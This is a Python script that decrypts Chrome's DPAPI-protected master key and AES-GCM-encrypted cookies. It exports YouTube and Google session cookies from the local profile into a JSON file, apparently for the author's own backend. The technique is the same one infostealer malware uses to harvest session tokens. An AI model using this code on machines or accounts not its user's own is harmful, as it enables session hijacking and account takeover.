import os
import sys
import json
import shutil
import sqlite3
import base64
import subprocess
import ctypes
from ctypes import wintypes

# Ensure pycryptodome is installed
try:
    from Crypto.Cipher import AES
except ImportError:
    print("Installing pycryptodome library...")
    try:
        subprocess.run([sys.executable, "-m", "pip", "install", "pycryptodome"], check=True)
        from Crypto.Cipher import AES
    except Exception as e:
        print(f"Error installing pycryptodome: {e}")
        print("Please run: pip install pycryptodome manually.")
        sys.exit(1)

# Windows DPAPI decryption structures and functions
class DATA_BLOB(ctypes.Structure):
    _fields_ = [
        ('cbData', wintypes.DWORD),
        ('pbData', ctypes.POINTER(ctypes.c_byte))
    ]

def decrypt_dpapi(data):
    in_blob = DATA_BLOB()
    in_blob.cbData = len(data)
    in_blob.pbData = ctypes.cast(ctypes.create_string_buffer(data), ctypes.POINTER(ctypes.c_byte))
    out_blob = DATA_BLOB()
    
    success = ctypes.windll.crypt32.CryptUnprotectData(
        ctypes.byref(in_blob),
        None,
        None,
        None,
        None,
        0,
        ctypes.byref(out_blob)
    )
    if not success:
        raise OSError("DPAPI Decryption failed.")
    
    decrypted_bytes = ctypes.string_at(out_blob.pbData, out_blob.cbData)
    ctypes.windll.kernel32.LocalFree(out_blob.pbData)
    return decrypted_bytes

def get_master_key(local_state_path):
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.loads(f.read())
    
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    # Strip DPAPI header (first 5 bytes)
    encrypted_key = encrypted_key[5:]
    # Decrypt key using DPAPI
    return decrypt_dpapi(encrypted_key)

def decrypt_cookie_value(encrypted_value, master_key):
    try:
        if encrypted_value.startswith(b'v10') or encrypted_value.startswith(b'v11'):
            nonce = encrypted_value[3:15]
            ciphertext = encrypted_value[15:-16]
            tag = encrypted_value[-16:]
            cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
            decrypted = cipher.decrypt_and_verify(ciphertext, tag)
            
            # Check for modern Chrome App-Bound Encryption metadata header (starts with b'<\xb2a^' or is not clean UTF-8 but has >32 bytes)
            if decrypted.startswith(b'<\xb2a^') or decrypted.startswith(b'\x3c\xb2\x61\x5e') or decrypted.startswith(b'\x01\x00\x00\x00'):
                return decrypted[32:].decode('utf-8')
            try:
                return decrypted.decode('utf-8')
            except UnicodeDecodeError:
                if len(decrypted) >= 32:
                    return decrypted[32:].decode('utf-8')
                raise
        else:
            # Older Chrome versions used DPAPI directly
            return decrypt_dpapi(encrypted_value).decode('utf-8')
    except Exception as e:
        # Decryption failed (e.g. key mismatch or empty value)
        return ""

def main():
    user_profile = os.environ.get("USERPROFILE")
    local_state_path = os.path.join(user_profile, r"AppData\Local\Google\Chrome\User Data\Local State")
    cookies_db_path = os.path.join(user_profile, r"AppData\Local\Google\Chrome\User Data\Default\Network\Cookies")
    
    target_dir = r"d:\bingo\backend\youtube_sessions"
    target_file = os.path.join(target_dir, "youtube_cookie_default.json")
    
    if not os.path.exists(local_state_path):
        print(f"Error: Chrome Local State not found at: {local_state_path}")
        sys.exit(1)
        
    if not os.path.exists(cookies_db_path):
        print(f"Error: Chrome Cookies database not found at: {cookies_db_path}")
        sys.exit(1)
        
    print("Reading master key from Chrome Local State...")
    master_key = get_master_key(local_state_path)
    
    # Copy DB to a temp file because it might be locked by running Chrome instances
    temp_db_path = os.path.join(os.environ.get("TEMP"), "chrome_cookies_temp.db")
    if os.path.exists(temp_db_path):
        os.remove(temp_db_path)
        
    print("Copying cookies database...")
    shutil.copyfile(cookies_db_path, temp_db_path)
    
    print("Querying and decrypting cookies...")
    conn = sqlite3.connect(temp_db_path)
    cursor = conn.cursor()
    
    # We select host_key, name, path, expires_utc, is_secure, is_httponly, same_site, encrypted_value
    # Chrome cookie timestamps: microseconds since 1601-01-01
    cursor.execute("""
        SELECT host_key, name, path, expires_utc, is_secure, is_httponly, samesite, encrypted_value 
        FROM cookies 
        WHERE host_key LIKE '%youtube.com' OR host_key LIKE '%google.com' OR host_key LIKE '%youtube.de' OR host_key LIKE '%google.de'
    """)
    
    same_site_map = {
        -1: None,
        0: "no_restriction",
        1: "Lax",
        2: "Strict",
        3: "Extended"
    }
    
    decrypted_cookies = []
    
    for row in cursor.fetchall():
        host_key, name, path, expires_utc, is_secure, is_httponly, same_site, encrypted_value = row
        
        value = decrypt_cookie_value(encrypted_value, master_key)
        if not value:
            continue
            
        # Convert timestamp to Unix seconds
        # 11644473600 is difference between 1601 and 1970 in seconds
        if expires_utc > 0:
            expiration_date = int((expires_utc / 1000000) - 11644473600)
        else:
            expiration_date = 0
            
        # Map German domains to global .com domains
        domain = host_key
        if "google.de" in domain:
            domain = domain.replace("google.de", "google.com")
        elif "youtube.de" in domain:
            domain = domain.replace("youtube.de", "youtube.com")
            
        cookie_obj = {
            "domain": domain,
            "name": name,
            "value": value,
            "path": path,
            "expirationDate": expiration_date,
            "secure": bool(is_secure),
            "httpOnly": bool(is_httponly),
            "sameSite": same_site_map.get(same_site)
        }
        decrypted_cookies.append(cookie_obj)
        
    conn.close()
    try:
        os.remove(temp_db_path)
    except OSError:
        pass
        
    # Ensure target directory exists
    os.makedirs(target_dir, exist_ok=True)
    
    print(f"Writing {len(decrypted_cookies)} cookies to {target_file}...")
    with open(target_file, "w", encoding="utf-8") as f:
        json.dump(decrypted_cookies, f, indent=4)
        
    print("Done! Cookies successfully exported and saved.")

if __name__ == "__main__":
    main()
